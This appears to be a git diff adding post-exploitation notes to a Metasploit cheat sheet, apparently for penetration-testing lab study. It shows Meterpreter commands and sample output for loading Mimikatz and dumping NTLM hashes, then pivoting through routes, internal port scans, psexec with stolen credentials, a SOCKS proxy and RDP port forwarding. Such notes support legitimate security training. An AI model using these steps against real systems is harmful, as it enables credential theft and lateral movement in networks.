@@ -39,6 +39,12 @@ run -j  // Run in background
 ```
 
 ### Post-exploitation
+
+Getting system privileges
+```
+getuid
+```
+###### Example
 ```
 (Meterpreter 5)(C:\Users\luiza) > getuid
 Server username: ITWK01\luiza
@@ -48,5 +54,97 @@ Server username: ITWK01\luiza
 Server username: NT AUTHORITY\SYSTEM
 (Meterpreter 5)(C:\Users\luiza) > 
 
+```
+
+
+Loading Mimikatz and obtaining hashes:
+```
+load kiwi
+creds_msv
+```
+###### Example
+```
+(Meterpreter 6)(C:\Users\luiza) > load kiwi        
+Loading extension kiwi...                  
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)  
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+    
+Success.
+(Meterpreter 6)(C:\Users\luiza) > creds_msv  
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
+offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd
+
+```
+
+
+#### Pivoting
+Scanning other IPs
+```
+ipconfig
+// Check the internal IP (Ethernet adapter IPv4 Address)
+
+// If in a Meterpreter session 
+background
+
+// Use the IP from the previous step, replacing the last octet with a 0. This will enable Metasploit to use the IP as a target, and the sessoin to target it to.
+route add INTERNAL_IP /24 SESSION_ID
+// To check
+route print
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS TARGET_INTERNAL_IP_ADDRESS
+set PORTS TARGET_PORTS                 // Suggester: 445, 3389. If the SMB ports are open, use exploit/windows/smb/psexec with the known credentials.
+run
+```
+
+First, make sure that the `/etc/proxychains.conf` port is set to `1080`.
+
+```
+// If in a Meterpreter session:
+background
+
+// Setting up the proxy
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+run -j
+
+// Regular commands can now be ran
+proxychains xfreerdp /v:
+
+```
+
+##### Port forwarding in a Meterpreter session
+
+Portfwd will create a local TCP relay of a remote port.
+```
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+OPTIONS:
+    -i   Index of the port forward entry to interact with (see the "list" command).
+    -l   Forward: local port to listen on. Reverse: local port to connect to.
+    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r   Forward: remote host to connect to.
+    -R   Indicates a reverse port forward.
+```
+
+```
+sessions -i SESSION_TO_ENTER
+portfwd -h
+
+
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+
+xfreerdp /v:127.0.0.1 /u:USER
 ```
 
